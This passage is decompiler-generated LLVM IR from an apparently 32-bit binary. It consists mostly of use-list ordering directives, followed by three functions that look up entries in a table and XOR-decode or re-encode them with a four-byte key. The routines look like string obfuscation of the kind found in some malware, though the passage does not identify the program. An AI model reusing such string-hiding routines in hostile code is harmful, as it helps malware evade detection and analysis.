  uselistorder i32 %v1_8050cff, { 1, 2, 0 }
  uselistorder i32 %v1_8050c86, { 1, 2, 0 }
  uselistorder i32 %v1_8050c0d, { 1, 2, 0 }
  uselistorder i32 %v0_8050bc7, { 1, 0 }
  uselistorder i32 %v0_8050b76, { 1, 0 }
  uselistorder i32 %v0_8050ff7, { 1, 0 }
  uselistorder i32 %v7_8050ac8, { 1, 0 }
  uselistorder i32 %v0_8050ac8, { 1, 2, 0 }
  uselistorder i32 %v6_8050abb, { 1, 0 }
  uselistorder i32 %v0_8050abb, { 0, 2, 1 }
  uselistorder i32 %v6_8050aae, { 1, 0 }
  uselistorder i32 %v2_8050a9a, { 1, 0, 2 }
  uselistorder i32 %v1_8050a97, { 1, 0, 2 }
  uselistorder i32 %v0_8050a94, { 1, 0 }
  uselistorder i32 %v0_8050a90, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v2_805060e, { 1, 0 }
  uselistorder i32 %v0_805060e, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v1_805060e, { 0, 2, 1 }
  uselistorder i32 %v0_805068c128, { 1, 0 }
  uselistorder i32 %v1_8050a10, { 2, 1, 0 }
  uselistorder i32 %v9_80509df, { 1, 0 }
  uselistorder i32 %v0_8050c86, { 0, 1, 3, 2 }
  uselistorder i32 %v9_805094c, { 1, 0 }
  uselistorder i32 %v1_8050945, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_8050945, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_805091c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80508f6, { 1, 2, 0 }
  uselistorder i32 %v1_80508f6, { 1, 2, 0, 3 }
  uselistorder i32 %v3_80508f1, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_80508c7, { 1, 0, 2 }
  uselistorder i32 %v0_805089b, { 0, 2, 1 }
  uselistorder i32 %v0_8050874, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32* %v1_8050dfb, { 0, 2, 1 }
  uselistorder i32 %v0_805082b, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_8050802, { 2, 1, 0 }
  uselistorder i32 %v9_80507d1, { 1, 0 }
  uselistorder i32 %v0_8050c0d, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80507bd, { 2, 1, 0 }
  uselistorder i32 %v9_805078c, { 1, 0 }
  uselistorder i32 %v0_8050cff, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050762, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050752, { 2, 1, 0 }
  uselistorder i32 %v9_805072a, { 1, 0 }
  uselistorder i32 %v0_8050bbb, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050706, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80506e8, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_80506e3, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80506d3, { 2, 1, 0 }
  uselistorder i32 %v9_80506a2, { 1, 0 }
  uselistorder i32 %v0_8050b6a, { 0, 1, 3, 2 }
  uselistorder i32 %v2_8050680, { 1, 0 }
  uselistorder i32 %v0_8050680, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_805067a, { 0, 1, 3, 2 }
  uselistorder i32 %v0_805067a, { 0, 2, 1 }
  uselistorder i32 %v0_8050675, { 1, 0 }
  uselistorder i32 %v0_8050650, { 1, 0, 2 }
  uselistorder i32 %v1_8050637, { 1, 0, 2 }
  uselistorder i32 %v1_805061b, { 1, 0, 2 }
  uselistorder i32 %v0_8050a30, { 1, 0, 2 }
  uselistorder i32 %v0_8050a1b, { 3, 0, 1, 2 }
  uselistorder i32 %v0_805068c129, { 3, 0, 1, 2 }
  uselistorder i32 %v2_805060e18, { 1, 0 }
  uselistorder i32 %v3_80505f5, { 1, 0 }
  uselistorder i32 %v0_80505f5, { 7, 21, 8, 19, 9, 18, 10, 20, 11, 16, 12, 15, 0, 14, 22, 17, 13, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v1_80505e0, { 0, 2, 1 }
  uselistorder i32 %v0_80505dc, { 1, 0 }
  uselistorder i32 %v0_80505c3, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v1_80505b9, { 1, 0 }
  uselistorder i32 %v1_8050580, { 2, 1, 0 }
  uselistorder i32 %v9_805054f, { 1, 0 }
  uselistorder i32 %v0_8050d78, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805053d, { 1, 0 }
  uselistorder i32 %v0_805053d, { 0, 2, 3, 1 }
  uselistorder i32 %v1_805051c, { 1, 0 }
  uselistorder i32 %v2_8050519, { 1, 0 }
  uselistorder i32 %v0_8050517, { 1, 0 }
  uselistorder i32 %v0_8050504, { 2, 1, 0 }
  uselistorder i32 %v1_8050501, { 1, 0 }
  uselistorder i32 %v2_80504fe, { 1, 0 }
  uselistorder i32 %v3_80504f2, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v2_805049d, { 1, 0 }
  uselistorder i32 %v1_805047f, { 1, 0 }
  uselistorder i32 %v0_805047f, { 0, 2, 3, 1 }
  uselistorder i32 %v2_805046a, { 1, 0 }
  uselistorder i32 %v3_8050467, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8050f4d, { 1, 0 }
  uselistorder i32 %v1_8050f4a, { 2, 1, 0 }
  uselistorder i32 %v3_805042f, { 1, 0, 2 }
  uselistorder i32 %v2_805042d, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_80503d7, { 1, 0 }
  uselistorder i32 %v1_80503cc, { 1, 0 }
  uselistorder i32 %v0_80503cc, { 1, 0 }
  uselistorder i32 %v0_80503d5, { 0, 3, 2, 1 }
  uselistorder i32 %v1_80503ac, { 1, 0 }
  uselistorder i32 %v0_80503ac, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v6_805039e, { 1, 0, 2 }
  uselistorder i32 %v4_8050361, { 1, 2, 0 }
  uselistorder i32 %v3_8050330, { 1, 0, 2 }
  uselistorder i32 %v0_80502b4, { 0, 2, 1 }
  uselistorder i32 %v0_80502ab, { 0, 3, 2, 1 }
  uselistorder i32 %v0_805007265, { 1, 0 }
  uselistorder i32 %v0_805028e, { 2, 1, 0 }
  uselistorder i8 %v1_8050260, { 1, 0 }
  uselistorder i8 %v2_805023a, { 0, 4, 5, 6, 7, 8, 10, 9, 3, 2, 1 }
  uselistorder i32 %v2_8050231, { 4, 8, 6, 1, 0, 2, 3, 5, 7 }
  uselistorder i32 %v5_805022f, { 3, 2, 5, 4, 1, 0 }
  uselistorder i32 %v1_8050229, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8050224, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80501d8, { 1, 0 }
  uselistorder i32 %v0_8050128, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8050123, { 1, 0 }
  uselistorder i32 %v1_8050100, { 0, 2, 1 }
  uselistorder i32 %v0_8050060, { 2, 0, 1 }
  uselistorder i32 %v0_8050024, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 8, 9, 10, 34, 36, 29, 37, 19, 0, 17, 21, 22, 23, 25, 26, 27, 38, 39, 40, 30, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 18, 20, 24, 28, 31, 32, 33, 41, 42, 55, 54, 43, 35, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %ecx.global-to-local, { 2, 3, 4, 5, 17, 18, 19, 20, 21, 22, 14, 23, 24, 8, 0, 7, 9, 15, 1, 25, 6, 10, 11, 12, 13, 16, 26, 39, 40, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %eax.global-to-local, { 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 45, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 127, 57, 139, 140, 58, 141, 142, 143, 144, 145, 147, 148, 149, 150, 151, 152, 153, 154, 155, 122, 123, 124, 59, 60, 61, 62, 63, 64, 156, 157, 158, 159, 160, 161, 90, 91, 92, 93, 94, 95, 96, 1, 2, 3, 4, 5, 6, 81, 82, 83, 84, 85, 86, 87, 99, 100, 101, 102, 103, 107, 108, 109, 110, 111, 112, 113, 114, 167, 168, 169, 170, 182, 134, 171, 172, 173, 174, 125, 135, 126, 128, 129, 130, 131, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 162, 163, 164, 165, 166, 66, 69, 67, 68, 70, 71, 72, 73, 74, 65, 75, 76, 77, 78, 79, 80, 88, 89, 97, 98, 104, 105, 106, 115, 116, 117, 118, 119, 120, 121, 132, 133, 136, 137, 138, 175, 176, 177, 178, 179, 180, 181, 183, 231, 232, 233, 229, 230, 0, 224, 225, 226, 227, 228, 184, 185, 186, 187, 188, 189, 190, 191, 192, 146, 193, 198, 194, 195, 196, 197, 199, 200, 201, 202, 203, 204, 205, 206, 55, 221, 223, 222, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220 }
  uselistorder i32 (i32)* @function_804f2b0, { 1, 0 }
  uselistorder i32 ()* @function_8052800, { 1, 0 }
  uselistorder i32 1864, { 1, 2, 0, 3 }
  uselistorder i8 31, { 0, 2, 3, 1 }
  uselistorder i32 1888, { 4, 0, 1, 2, 3 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 1, 0, 2 }
  uselistorder i32 ()* @function_80521bf, { 1, 0 }
  uselistorder i32 1872, { 0, 2, 1 }
  uselistorder i32 (i8)* @function_8051220, { 2, 3, 8, 7, 0, 6, 1, 5, 4, 35, 36, 30, 31, 32, 33, 34, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 37, 38, 39, 40 }
  uselistorder i32 (i32, i32*)* @function_80511f0, { 2, 3, 8, 7, 0, 6, 1, 4, 5, 38, 39, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 49, 35, 36, 37, 55, 56, 57, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54 }
  uselistorder i32 1880, { 0, 1, 2, 3, 4, 5, 10, 8, 6, 9, 7 }
  uselistorder i32 (i8)* @function_80512a0, { 2, 3, 8, 7, 0, 6, 1, 4, 5, 27, 28, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i8 ptrtoint (i32* @0 to i8), { 11, 12, 13, 14, 0, 1, 6, 7, 8, 9, 2, 3, 4, 5, 15, 16, 10, 17 }
  uselistorder i32 ()* @function_8051ca0, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 4, 3, 2, 13, 12, 11, 10, 9, 1, 0, 8, 7, 6, 5 }
  uselistorder i32 ()* @function_80528d4, { 21, 20, 19, 18, 17, 16, 15, 6, 5, 3, 2, 12, 11, 25, 24, 14, 13, 10, 9, 8, 7, 23, 22, 4, 1, 0 }
  uselistorder i8 -5, { 0, 3, 1, 2 }
  uselistorder i8 -3, { 6, 7, 8, 2, 0, 1, 3, 4, 5 }
  uselistorder i8 65, { 1, 0 }
  uselistorder i32 ()* @function_805285e, { 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 5, 3, 2, 4, 0, 1, 6 }
  uselistorder i8 35, { 6, 4, 3, 5, 1, 0, 2 }
  uselistorder i8 36, { 6, 4, 3, 5, 1, 0, 2, 7 }
  uselistorder i8 62, { 7, 4, 5, 3, 6, 1, 0, 2 }
  uselistorder i8 58, { 7, 4, 5, 3, 6, 1, 0, 2, 8, 9 }
  uselistorder i32 (i32*)* @function_8052452, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 ()* @function_8052398, { 2, 1, 0 }
  uselistorder i32 1572, { 1, 2, 0 }
  uselistorder i32 1700, { 2, 0, 1 }
  uselistorder i32 ()* @function_804f7b0, { 2, 3, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i8 6, { 0, 3, 4, 5, 6, 2, 7, 1 }
  uselistorder i32 ()* @function_8052891, { 1, 0 }
  uselistorder i32 -28, { 3, 2, 4, 5, 6, 0, 1 }
  uselistorder i32 -24, { 1, 0, 2, 3, 4 }
  uselistorder i32 -20, { 2, 1, 3, 4, 0, 5 }
  uselistorder i8 -1, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -15, { 1, 0 }
  uselistorder i32 (i32)* @function_804f020, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1844, { 1, 0, 2 }
  uselistorder i16* @global_var_80568d6.38, { 1, 0 }
  uselistorder i8 -58, { 1, 0 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 1868, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051117, { 1, 0 }
  uselistorder label %dec_label_pc_8050f0b, { 1, 0 }
  uselistorder label %dec_label_pc_8050af8, { 1, 0 }
  uselistorder label %dec_label_pc_8050a23, { 8, 4, 0, 3, 5, 6, 1, 2, 7 }
  uselistorder label %dec_label_pc_805060e.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80509df, { 1, 0 }
  uselistorder label %dec_label_pc_8050966, { 1, 0 }
  uselistorder label %dec_label_pc_8050936, { 1, 0 }
  uselistorder label %dec_label_pc_80508fc, { 1, 0 }
  uselistorder label %dec_label_pc_80508f1, { 3, 4, 10, 6, 1, 5, 7, 8, 0, 2, 11, 9 }
  uselistorder label %dec_label_pc_80507d1, { 1, 0 }
  uselistorder label %dec_label_pc_805078c, { 1, 0 }
  uselistorder label %dec_label_pc_8050755, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805072a, { 1, 0 }
  uselistorder label %dec_label_pc_80506d6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80506a2, { 1, 0 }
  uselistorder label %dec_label_pc_8050684, { 5, 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_8050663, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050650, { 1, 0 }
  uselistorder label %dec_label_pc_805063e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050612, { 1, 0 }
  uselistorder label %dec_label_pc_8050612.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80505e5, { 1, 0 }
  uselistorder label %dec_label_pc_80505e0, { 1, 0 }
  uselistorder label %dec_label_pc_805059e, { 1, 0 }
  uselistorder label %dec_label_pc_805058a, { 1, 0 }
  uselistorder label %dec_label_pc_8050583.loopexit12.loopexit, { 13, 11, 4, 9, 0, 5, 6, 7, 8, 10, 12, 1, 2, 3, 14 }
  uselistorder label %dec_label_pc_8050583.backedge, { 2, 4, 5, 3, 0, 1, 6 }
  uselistorder label %dec_label_pc_805054f, { 1, 0 }
  uselistorder label %dec_label_pc_805052e, { 5, 6, 7, 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_8050517, { 1, 0 }
  uselistorder label %dec_label_pc_80504bf, { 1, 0 }
  uselistorder label %dec_label_pc_8050470, { 0, 3, 4, 5, 1, 6, 2 }
  uselistorder label %dec_label_pc_805043b, { 1, 0 }
  uselistorder label %dec_label_pc_80503f5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80503cc, { 1, 0 }
  uselistorder label %dec_label_pc_80502e8, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_80502dd, { 1, 0 }
  uselistorder label %dec_label_pc_80502a2, { 1, 0 }
  uselistorder label %dec_label_pc_805026e, { 1, 0 }
  uselistorder label %dec_label_pc_8050224.preheader, { 16, 14, 13, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 15 }
  uselistorder label %dec_label_pc_8050072, { 1, 2, 4, 0, 3 }
}

define i32 @function_80511f0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_80511f0:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* @ecx, align 4
  %v1_80511f8 = icmp eq i32* %arg2, null
  %v1_80511fa = mul i32 %arg1, 8
  store i32 %v1_80511fa, i32* @edx, align 4
  br i1 %v1_80511f8, label %dec_label_pc_8051213, label %dec_label_pc_8051209

dec_label_pc_8051209:                             ; preds = %dec_label_pc_80511f0
  %v1_8051209 = add i32 %v1_80511fa, add (i32 ptrtoint (i32* @global_var_8056960.52 to i32), i32 4)
  %v2_8051209 = inttoptr i32 %v1_8051209 to i32*
  %v3_8051209 = load i32, i32* %v2_8051209, align 4
  %v1_805120c = urem i32 %v3_8051209, 65536
  store i32 %v1_805120c, i32* %arg2, align 4
  %v0_8051213.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051213

dec_label_pc_8051213:                             ; preds = %dec_label_pc_80511f0, %dec_label_pc_8051209
  %v0_8051213 = phi i32 [ %v1_80511fa, %dec_label_pc_80511f0 ], [ %v0_8051213.pre, %dec_label_pc_8051209 ]
  %v1_8051213 = add i32 %v0_8051213, ptrtoint (i32* @global_var_8056960.52 to i32)
  %v2_8051213 = inttoptr i32 %v1_8051213 to i32*
  %v3_8051213 = load i32, i32* %v2_8051213, align 4
  ret i32 %v3_8051213

; uselistorder directives
  uselistorder label %dec_label_pc_8051213, { 1, 0 }
}

define i32 @function_8051220(i8 %arg1) local_unnamed_addr {
dec_label_pc_8051220:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_8051229 = zext i8 %arg1 to i32
  %v1_805122d = mul nuw nsw i32 %v4_8051229, 8
  %v2_805122d = add i32 %v1_805122d, ptrtoint (i32* @global_var_8056960.52 to i32)
  store i32 %v2_805122d, i32* @ecx, align 4
  %v0_8051234 = load i16, i16* @global_var_80567dc.53, align 2
  %v1_8051234 = sext i16 %v0_8051234 to i32
  %v1_8051239 = add i32 %v1_805122d, add (i32 ptrtoint (i32* @global_var_8056960.52 to i32), i32 4)
  %v2_8051239 = inttoptr i32 %v1_8051239 to i16*
  %v3_8051239 = load i16, i16* %v2_8051239, align 4
  %v4_8051239 = icmp eq i16 %v3_8051239, 0
  br i1 %v4_8051239, label %dec_label_pc_805128a, label %dec_label_pc_8051240

dec_label_pc_8051240:                             ; preds = %dec_label_pc_8051220
  store i32 %v1_8051234, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v2_8051248 = udiv i32 %v1_8051234, 16777216
  %v2_805124b = udiv i32 %v1_8051234, 256
  store i32 %v2_805124b, i32* %edi.global-to-local, align 4
  %v5_805124e = trunc i32 %v2_8051248 to i8
  store i8 %v5_805124e, i8* %stack_var_-44, align 1
  %v2_8051251 = udiv i32 %v1_8051234, 65536
  store i32 %v2_8051251, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051254

dec_label_pc_8051254:                             ; preds = %dec_label_pc_8051254.dec_label_pc_8051254_crit_edge, %dec_label_pc_8051240
  %v0_805125a = phi i32 [ %v0_805125a.pre, %dec_label_pc_8051254.dec_label_pc_8051254_crit_edge ], [ %v1_8051234, %dec_label_pc_8051240 ]
  %v0_8051256 = phi i32 [ %v1_8051286, %dec_label_pc_8051254.dec_label_pc_8051254_crit_edge ], [ 0, %dec_label_pc_8051240 ]
  %v0_8051254 = phi i32 [ %v0_805127e, %dec_label_pc_8051254.dec_label_pc_8051254_crit_edge ], [ %v2_805122d, %dec_label_pc_8051240 ]
  %v1_8051254 = inttoptr i32 %v0_8051254 to i32*
  %v2_8051254 = load i32, i32* %v1_8051254, align 4
  %v2_8051258 = add i32 %v2_8051254, %v0_8051256
  %v1_805125c = inttoptr i32 %v2_8051258 to i8*
  %v2_805125c = load i8, i8* %v1_805125c, align 1
  %v4_805125c = trunc i32 %v0_805125a to i8
  %v5_805125c = xor i8 %v2_805125c, %v4_805125c
  store i8 %v5_805125c, i8* %v1_805125c, align 1
  %v0_805125e = load i32, i32* @edx, align 4
  %v0_8051260 = load i32, i32* @ecx, align 4
  %v1_8051260 = inttoptr i32 %v0_8051260 to i32*
  %v2_8051260 = load i32, i32* %v1_8051260, align 4
  %v2_8051262 = add i32 %v2_8051260, %v0_805125e
  %v0_8051264 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051266 = inttoptr i32 %v2_8051262 to i8*
  %v2_8051266 = load i8, i8* %v1_8051266, align 1
  %v4_8051266 = trunc i32 %v0_8051264 to i8
  %v5_8051266 = xor i8 %v2_8051266, %v4_8051266
  store i8 %v5_8051266, i8* %v1_8051266, align 1
  %v0_8051268 = load i32, i32* @edx, align 4
  %v0_805126a = load i32, i32* @ecx, align 4
  %v1_805126a = inttoptr i32 %v0_805126a to i32*
  %v2_805126a = load i32, i32* %v1_805126a, align 4
  %v2_805126c = add i32 %v2_805126a, %v0_8051268
  %v0_805126e = load i32, i32* %esi.global-to-local, align 4
  %v1_8051270 = inttoptr i32 %v2_805126c to i8*
  %v2_8051270 = load i8, i8* %v1_8051270, align 1
  %v4_8051270 = trunc i32 %v0_805126e to i8
  %v5_8051270 = xor i8 %v2_8051270, %v4_8051270
  store i8 %v5_8051270, i8* %v1_8051270, align 1
  %v0_8051272 = load i32, i32* @edx, align 4
  %v0_8051274 = load i32, i32* @ecx, align 4
  %v1_8051274 = inttoptr i32 %v0_8051274 to i32*
  %v2_8051274 = load i32, i32* %v1_8051274, align 4
  %v1_8051276 = add i32 %v0_8051272, 1
  store i32 %v1_8051276, i32* @edx, align 4
  %v2_8051277 = add i32 %v2_8051274, %v0_8051272
  %v2_8051279 = load i8, i8* %stack_var_-44, align 1
  %v1_805127c = inttoptr i32 %v2_8051277 to i8*
  %v2_805127c = load i8, i8* %v1_805127c, align 1
  %v5_805127c = xor i8 %v2_805127c, %v2_8051279
  store i8 %v5_805127c, i8* %v1_805127c, align 1
  %v0_805127e = load i32, i32* @ecx, align 4
  %v1_805127e = add i32 %v0_805127e, 4
  %v2_805127e = inttoptr i32 %v1_805127e to i32*
  %v3_805127e = load i32, i32* %v2_805127e, align 4
  %v1_8051281 = urem i32 %v3_805127e, 65536
  %v1_8051286 = load i32, i32* @edx, align 4
  %v8_8051288 = icmp sgt i32 %v1_8051281, %v1_8051286
  br i1 %v8_8051288, label %dec_label_pc_8051254.dec_label_pc_8051254_crit_edge, label %dec_label_pc_805128a.loopexit

dec_label_pc_8051254.dec_label_pc_8051254_crit_edge: ; preds = %dec_label_pc_8051254
  %v0_805125a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051254

dec_label_pc_805128a.loopexit:                    ; preds = %dec_label_pc_8051254
  br label %dec_label_pc_805128a

dec_label_pc_805128a:                             ; preds = %dec_label_pc_805128a.loopexit, %dec_label_pc_8051220
  %v0_8051291 = phi i32 [ %v1_8051281, %dec_label_pc_805128a.loopexit ], [ %v1_8051234, %dec_label_pc_8051220 ]
  ret i32 %v0_8051291

; uselistorder directives
  uselistorder i32 %v1_8051286, { 1, 0 }
  uselistorder i32 %v1_8051281, { 1, 0 }
  uselistorder i32 %v0_805127e, { 1, 0 }
  uselistorder i32 %v1_8051234, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_80512a0(i8 %arg1) local_unnamed_addr {
dec_label_pc_80512a0:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_80512a9 = zext i8 %arg1 to i32
  %v1_80512ad = mul nuw nsw i32 %v4_80512a9, 8
  %v2_80512ad = add i32 %v1_80512ad, ptrtoint (i32* @global_var_8056960.52 to i32)
  store i32 %v2_80512ad, i32* %ecx.global-to-local, align 4
  %v0_80512b4 = load i16, i16* @global_var_80567dc.53, align 2
  %v1_80512b4 = sext i16 %v0_80512b4 to i32
  %v1_80512b9 = add i32 %v1_80512ad, add (i32 ptrtoint (i32* @global_var_8056960.52 to i32), i32 4)
  %v2_80512b9 = inttoptr i32 %v1_80512b9 to i16*
  %v3_80512b9 = load i16, i16* %v2_80512b9, align 4
  %v4_80512b9 = icmp eq i16 %v3_80512b9, 0
  br i1 %v4_80512b9, label %dec_label_pc_805130a, label %dec_label_pc_80512c0

dec_label_pc_80512c0:                             ; preds = %dec_label_pc_80512a0
  store i32 %v1_80512b4, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_80512c8 = udiv i32 %v1_80512b4, 16777216
  %v2_80512cb = udiv i32 %v1_80512b4, 256
  store i32 %v2_80512cb, i32* %edi.global-to-local, align 4
  %v5_80512ce = trunc i32 %v2_80512c8 to i8
  store i8 %v5_80512ce, i8* %stack_var_-44, align 1
  %v2_80512d1 = udiv i32 %v1_80512b4, 65536
  store i32 %v2_80512d1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80512d4

dec_label_pc_80512d4:                             ; preds = %dec_label_pc_80512d4.dec_label_pc_80512d4_crit_edge, %dec_label_pc_80512c0
  %v0_80512da = phi i32 [ %v0_80512da.pre, %dec_label_pc_80512d4.dec_label_pc_80512d4_crit_edge ], [ %v1_80512b4, %dec_label_pc_80512c0 ]
  %v0_80512d6 = phi i32 [ %v1_8051306, %dec_label_pc_80512d4.dec_label_pc_80512d4_crit_edge ], [ 0, %dec_label_pc_80512c0 ]
  %v0_80512d4 = phi i32 [ %v0_80512fe, %dec_label_pc_80512d4.dec_label_pc_80512d4_crit_edge ], [ %v2_80512ad, %dec_label_pc_80512c0 ]
  %v1_80512d4 = inttoptr i32 %v0_80512d4 to i32*
  %v2_80512d4 = load i32, i32* %v1_80512d4, align 4
  %v2_80512d8 = add i32 %v2_80512d4, %v0_80512d6
  %v1_80512dc = inttoptr i32 %v2_80512d8 to i8*
  %v2_80512dc = load i8, i8* %v1_80512dc, align 1
  %v4_80512dc = trunc i32 %v0_80512da to i8
  %v5_80512dc = xor i8 %v2_80512dc, %v4_80512dc
  store i8 %v5_80512dc, i8* %v1_80512dc, align 1
  %v0_80512de = load i32, i32* %edx.global-to-local, align 4
  %v0_80512e0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80512e0 = inttoptr i32 %v0_80512e0 to i32*
  %v2_80512e0 = load i32, i32* %v1_80512e0, align 4
  %v2_80512e2 = add i32 %v2_80512e0, %v0_80512de
  %v0_80512e4 = load i32, i32* %edi.global-to-local, align 4
  %v1_80512e6 = inttoptr i32 %v2_80512e2 to i8*
  %v2_80512e6 = load i8, i8* %v1_80512e6, align 1
  %v4_80512e6 = trunc i32 %v0_80512e4 to i8
  %v5_80512e6 = xor i8 %v2_80512e6, %v4_80512e6
  store i8 %v5_80512e6, i8* %v1_80512e6, align 1
  %v0_80512e8 = load i32, i32* %edx.global-to-local, align 4
  %v0_80512ea = load i32, i32* %ecx.global-to-local, align 4
  %v1_80512ea = inttoptr i32 %v0_80512ea to i32*
  %v2_80512ea = load i32, i32* %v1_80512ea, align 4
  %v2_80512ec = add i32 %v2_80512ea, %v0_80512e8
  %v0_80512ee = load i32, i32* %esi.global-to-local, align 4
  %v1_80512f0 = inttoptr i32 %v2_80512ec to i8*
  %v2_80512f0 = load i8, i8* %v1_80512f0, align 1
  %v4_80512f0 = trunc i32 %v0_80512ee to i8
  %v5_80512f0 = xor i8 %v2_80512f0, %v4_80512f0
  store i8 %v5_80512f0, i8* %v1_80512f0, align 1
  %v0_80512f2 = load i32, i32* %edx.global-to-local, align 4
  %v0_80512f4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80512f4 = inttoptr i32 %v0_80512f4 to i32*
  %v2_80512f4 = load i32, i32* %v1_80512f4, align 4
  %v1_80512f6 = add i32 %v0_80512f2, 1
  store i32 %v1_80512f6, i32* %edx.global-to-local, align 4
  %v2_80512f7 = add i32 %v2_80512f4, %v0_80512f2
  %v2_80512f9 = load i8, i8* %stack_var_-44, align 1
  %v1_80512fc = inttoptr i32 %v2_80512f7 to i8*
  %v2_80512fc = load i8, i8* %v1_80512fc, align 1
  %v5_80512fc = xor i8 %v2_80512fc, %v2_80512f9
  store i8 %v5_80512fc, i8* %v1_80512fc, align 1
  %v0_80512fe = load i32, i32* %ecx.global-to-local, align 4
  %v1_80512fe = add i32 %v0_80512fe, 4
  %v2_80512fe = inttoptr i32 %v1_80512fe to i32*
  %v3_80512fe = load i32, i32* %v2_80512fe, align 4
  %v1_8051301 = urem i32 %v3_80512fe, 65536
  %v1_8051306 = load i32, i32* %edx.global-to-local, align 4
  %v8_8051308 = icmp sgt i32 %v1_8051301, %v1_8051306
  br i1 %v8_8051308, label %dec_label_pc_80512d4.dec_label_pc_80512d4_crit_edge, label %dec_label_pc_805130a.loopexit

dec_label_pc_80512d4.dec_label_pc_80512d4_crit_edge: ; preds = %dec_label_pc_80512d4
  %v0_80512da.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80512d4

dec_label_pc_805130a.loopexit:                    ; preds = %dec_label_pc_80512d4
  br label %dec_label_pc_805130a

dec_label_pc_805130a:                             ; preds = %dec_label_pc_805130a.loopexit, %dec_label_pc_80512a0
  %v0_8051311 = phi i32 [ %v1_8051301, %dec_label_pc_805130a.loopexit ], [ %v1_80512b4, %dec_label_pc_80512a0 ]
  ret i32 %v0_8051311

; uselistorder directives
  uselistorder i32 %v1_8051306, { 1, 0 }
